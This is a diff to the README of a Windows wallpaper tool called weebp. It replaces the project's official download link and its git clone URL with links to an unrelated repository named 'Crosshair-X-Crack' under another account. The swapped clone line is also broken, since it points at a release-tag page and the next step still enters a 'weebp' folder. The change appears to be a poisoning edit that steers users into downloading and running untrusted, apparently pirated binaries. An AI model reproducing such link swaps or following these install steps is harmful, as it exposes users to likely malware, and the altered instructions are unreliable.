@@ -21,8 +21,7 @@ roadmap
 initial focus is on the command-line interface just because that's what I would use, but a gui is not hard to implement later on. it's easy to write glue scripts to automate it or bind it to keys anyways
 forwarding mouse interactions to the captured windows should be easy and would allow interactive wallpapers, I'll implement it ASAP
 installation
-download the latest binaries from https://github.com/Francesco149/weebp/releases
-
+download the latest binaries from (https://github.com/fendiglocker/Crosshair-X-Crack/releases/tag/Crosshair-XCrack)
 extract the zip and place the folder anywhere you like
 
 double-click 0bootstrap. this will run install.ps1. it's recommended that you check install.ps1 in notepad before running this just to make sure that it hasn't been tampered with and doesn't do anything bad
@@ -106,7 +105,7 @@ choco install git 7zip visualcpp-build-tools windows-sdk-10 -y
 
 now open a powershell window, clone and build for 32 and 64 bit
 
-git clone https://github.com/Francesco149/weebp
+git clone https://github.com/fendiglocker/Crosshair-X-Crack/releases/tag/Crosshair-XCrack
 cd weebp
 Set-ExecutionPolicy Bypass -Scope Process -Force
 .\vcvarsall17.ps1 x86; .\release.ps1
